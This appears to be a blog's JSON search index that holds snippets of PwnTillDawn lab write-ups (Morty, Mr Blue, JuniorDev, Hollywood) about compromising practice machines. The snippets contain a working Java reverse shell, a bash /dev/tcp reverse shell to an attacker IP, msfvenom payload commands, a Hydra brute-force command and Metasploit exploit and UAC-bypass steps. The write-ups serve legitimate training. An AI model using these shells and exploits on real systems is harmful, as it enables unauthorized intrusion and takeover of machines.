target.Navigate to http://10.150.150.212/backdoor.php?cmd=whoami and we have code execution on the target. You can replace whoami in the url with any windows commands.&amp;gt; Post ExploitationThis target does not need post exploitation but to challenge yourself, why don‚Äôt you try to spawn a reverse shell on the target and find your way up to NT AUTHORITY\\SYSTEM. Good luck researcher‚Ä¶:)Reference: PwnTillDawn Online battlefield" }, { "title": "Morty Writeup PwnTillDawn", "url": "/posts/Morty/", "categories": "Blogging, PwnTillDawn", "tags": "writeups, vhost, steghide, lfi, phpmyadmin, msfconsole", "date": "2021-11-28 05:33:00 +0000", "snippet": "&amp;gt; Information GatheringFrom nmap, we have 3 open ports which are 22 (ssh), 53 (dns) &amp;amp; 80 (http). Port 22 and 80 are common ports but port 53 (dns) is hardly found on targets. This is quite some good information we‚Äôve found.When we visit port 80, there wasn‚Äôt any webapp running there except a file note.html included in web directory.Looking into the note.html file, there was a message from Rick to Morty. In this message, the domain name &#39;mortysserver.com&#39; was mentioned.The obvious step is to add the domain name we found from the message to our host file. To do this i typed sudo nano /etc/hosts then i added the ipaddress of the target and attached the domain name to it.After adding the domain name to our host file, we can access the new web address http://mortysserver.com/. The vhost has a welcome message and also a statement which stands out. The statement is Is it a password? Maybe..After digging deep for some time i thought of grabbing the background image on the http://mortysserver.com/ domain to investigate it. To download the image, i used the command wget http://mortysserver.com/screen.jpeg.I tried exiftool and got nothing. Then i thought of trying steghide too just in case there is a hidden information in the background image. I installed steghide using the command sudo apt install steghide then i used steghide on the image file to extract hidden information. Command used was steghide extract -sf screen.jpeg. Steghide prompted for password and i hit enter on the keyboard. Luckily for us, there was really a hidden information in the image. Steghide extracted a text file called keystotheunivers.txt from the image. Reading the contents of the keystotheunivers.txt displayed a username and a password rick:WubbaLubbaDubDub1!.The obvious place we all will try to login with credentials is ssh on port 22 right? Unfortunately, that didn‚Äôt work. Now the question is ‚Äúon which service do we have to use this credential we found?‚Äù. After thinking for a while i remembered that from nmap results, we found port 53 (dns) so the only option was to query the dns service of the target. I executed the command dig mortysserver.com axfr @10.150.150.57 and from the results, we found out that there is another vhost on the target. Th new domain name we found was rickscontrolpanel.mortysserver.com.I quickly added the new hostname rickscontrolpanel.mortysserver.com to my host file like we did earlier on. sudo nano /etc/hostsAfter adding the domain name to our host file, we browsed the new domain name rickscontrolpanel.mortysserver.com and found phpMyAdmin running on this vhost.We found credentials from the image remember? now is a good time to try it. Using the credentials, we found earlier on phpMyAdmin, we were able to login using rick:WubbaLubbaDubDub1!After logging in successfully and got access to the phpMyAdmin dashboard, i tried many ways to get a remote code execution manually from phpMyAdmin but i failed. The version of phpMyAdmin running on the target is Version information: 4.8.1. I quickly googled the version and found and exploit. The exploit we found on rapid7 indicates that phpMyAdmin v4.8.0 and v4.8.1 are vulnerable to local file inclusion, which can be exploited post-authentication to execute PHP code by application.Start msfconsole and load the exploit module using the command use exploit/multi/http/phpmyadmin_lfi_rce. Set all required options that this exploit depends on. PASSWORD, VHOST, USERNAME, RHOST, RPORT &amp;amp; LHOST.When all exploit options are set, type run or exploit in msfconsole and wait for the exploit to run against the target. You should be presented with a spawned shell in msfconsole on the target. Reference: PwnTillDawn Online battlefield" }, { "title": "Mr Blue Writeup PwnTillDawn", "url": "/posts/Mr_Blue/", "categories": "Blogging, PwnTillDawn", "tags": "writeups, eternalblue, ms17-010, metasploit, nmap, mr blue", "date": "2021-11-28 03:33:00 +0000", "snippet": "&amp;gt; Information GatheringThe Default nmap scan showed many active ports on the target. We can see some major ports like 80 (http), 445 (smb) &amp;amp; 3389 (rdp). The target is running an outdated version of windows Windows Server 2008 R2 Enterprise 7601. Nmap has its scripting engine. To find vulnerabilities on this target, lets run nmap scan against the target invoking some NSE (nmap scripting engine) arguments. This type os scan will identify vulnerabilities on the target.nmap --script=vuln,exploit 10.150.150.242While waiting for the NSE scan to complete, let‚Äôs take a look at what webapp runs on the port 80. It looks like a static html website.From the NSE scan, we can see that the target is vulnerable to ms17-010 with an impact of remote code execution. This vulnerability is popularly known as eternalblue. Since We know the vulnerability, a quick google will lead us to the right exploit.We found an approved exploit from rapid7. This exploit will corrupt the windows kernels using the smb protocol continuously until triggered.The next step is to start msfconsole load the module use exploit/windows/smb/ms17_010_eternalblue and fill the required options for this exploit to function. The required options are RHOSTS (Target IP), RPORT (Target port) &amp;amp; LHOST(Your Tun0 IP).After setting the required options for this module to work, we can fire the exploit against the target using either run or exploit command. Wait for a few seconds for the exploit to run and when completed, you will have a meterpreter shell Reference: PwnTillDawn Online battlefield" }, { "title": "JuniorDev Writeup PwnTillDawn", "url": "/posts/Junior-Dev/", "categories": "Blogging, PwnTillDawn", "tags": "writeups, jenkins, portfwd, python, hydra", "date": "2021-11-27 03:33:00 +0000", "snippet": "&amp;gt; Information GatheringStarted with the usual nmap scan and from the scan we can see active ports. port 22 (ssh) &amp;amp; port 30609 (jetty 9.4.27).Upon visiting the web service running on port 30609, i found a login screen.Since we don‚Äôt have any credentials, the best option is to bruteforce the target web login. Below is the hydra command usedhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form &quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^&amp;amp;from=%2F&amp;amp;Submit=Sign+in:Invalid username or password&quot;Hydra yield positive results. We have found the password for the admin user. The next step is to login on jetty webapp running on port 30609. username == admin &amp;amp; password == matrixThe credentials worked we are logged in now.After a short googling on how to abuse jenkins script console to rce we found a good post from gquere. With this information, we were able to build a script to test remote code execution on the target. Now that we can execute commands on the target, it‚Äôs time to spawn a reverse shell. Below is the script I used.String host=&quot;10.66.67.114&quot;; int port=9001; String cmd=&quot;/bin/bash&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&amp;gt;0)so.write(pi.read());while(pe.available()&amp;gt;0)so.write(pe.read());while(si.available()&amp;gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); &amp;gt; Post ExploitationAfter i got a shell, post enumeration phase begins. I transferred linpeas to the target, changer permissions and executed linpeas. In linpeas output, i found a port binded to the loopback address(127.0.0.1:8080).Port 8080 is mostly used for web services. To confirm, i tried wget on the ort since curl is not found on the target.Reading the fetched index.html from port 8080 indicates that there is a web webapp running internally.To access this internal web service, we have to port-forward port 8080 from the target to our attacking machine. To do this, i created a linux payload using msfvenom. msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.66.66.78 LPORT=9002 -f elf -o 9002msfThe next thing to do is to transfer the payload to the target and execute it while msfconsole is listerning for incoming connections.When the payload is executed on the target, we should recieve a connection back on msfconsole. Once the connection is in, we can port-forward the target intertnal port 8080 to our attacking machine using the portfwd command in msfconsoleportfwd add -l 8080 -p 8080 -r 127.0.0.1Now that we the target port 8080 connected back to our attacking machine, when visited, we found a python math console.Since it‚Äôs a simple python math calculator, we can easily bypass the python functions and gain a remote code execution. To do this, we will use __import__(&quot;os&quot;).system(&quot;&quot;)We created a bash file with contains our bash reverse liner. a simple bash script, transferred the bash file to the target.#!/bin/bashbash -c &#39;bash -i&amp;gt;&amp;amp;/dev/tcp/10.66.66.78/9002 0&amp;gt;&amp;amp;1&#39;Once our bash file is on the target, we can execute the bash file using the python calculator. We simply do this using the command__import__(&quot;os&quot;).system(&quot;/bin/bash /tmp/shell.sh&quot;)Reference: PwnTillDawn Online battlefield" }, { "title": "Hollywood Writeup PwnTillDawn", "url": "/posts/Hollywood/", "categories": "Blogging, PwnTillDawn", "tags": "writeups, tomcat, activemq, msfconsole", "date": "2021-11-27 01:33:00 +0000", "snippet": "&amp;gt; Information GatheringThe Default nmap scan showed many active ports on the target. We can see some major ports like 21 (ftp), 25 (smtp), 80 (http), 110 (pop3) 445 (smb), 8080 (tomcat) &amp;amp; 8161 (activemq). xampp was found running on the default port 80, directory brute forcing this page did not yield any results.Apache tomcat was setup on port 8080 with host-manager login disallowed and the default tomcat credentials did not work on manager app. Digging deeper on port 8161, we found Apache activemq running.The first thing i always do is to try the default login creds on webapps. I tried to login with the default username and password admin:admin on activemq just like we did on tomcat.Luckily for us, the default admin:admin worked and we logged in successfully.On the admin dashboard, the version of activemq running on the target is 5.11.1. We performed a quick google to find any known exploit.We found an approved exploit from rapid7. Load this module into msfconsole using use windows/http/apache_activemq_traversal_upload, setup the required module options for this exploit. RHOST, RPORT, USERNAME, PASSWORD &amp;amp; LHOST. Without these module options complete, the exploit will fail to execute.All module options set?? then launch an attack using either run or exploit command in msfconsole. If successful, we should spawn a shell on the target.&amp;gt; Post ExploitationWinpeas and other tools did not provide me with any good information. So, i decided to create a staged payload using msfvenom. To create a payload, use this msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.66.66.78 LPORT=4444 -f exe -o test.exeThen transferred this to the target, setup another msfconsole listener then executed the test.exe on the target.We should have another session in the new msfconsole listener. Let‚Äôs background this session using the command bg or background. Load msfconsole post exploitation module by typing use post/multi/recon/local_exploot_suggester. Once the module is loaded, set the session to your current session using set session (session number) and type run.After waiting for some time for the results of the post module, we realized we could bypass User Account Control to become NT AUTHORITY\\SYSTEM. To do this, we need to load the module exploit/windows/local/bypassuac_eventvwr, set session and lhost then execute the exploit again using either run or exploit.This module will bypass Windows UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when the Windows Event Viewer is launched. We have successfully hijacked C:\\Windows\\System32\\eventvwr.exe on the target But we are still not administrator. So, we will use the getsystem command. This command will use a number of different techniques in attempt to gain SYSTEM level privileges on the targetThe technique worked and we are NT AUTHORITY\\SYSTEM through the Named Pipe Impersonation technique. We have fully compromised this target.Referrence: PwnTillDawn Online battlefield" } ]
